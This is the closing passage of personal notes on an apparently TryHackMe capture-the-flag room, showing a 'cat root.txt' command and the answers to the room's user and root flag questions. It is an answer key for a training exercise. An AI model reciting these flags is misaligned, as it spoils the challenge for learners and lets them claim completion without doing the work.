cat root.txt
THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}

```

![[Pasted image 20230704220727.png]]

![[Pasted image 20230704222608.png]]

What is the user flag?

*THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}*

What is the root flag?

*THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}*


[[battery]]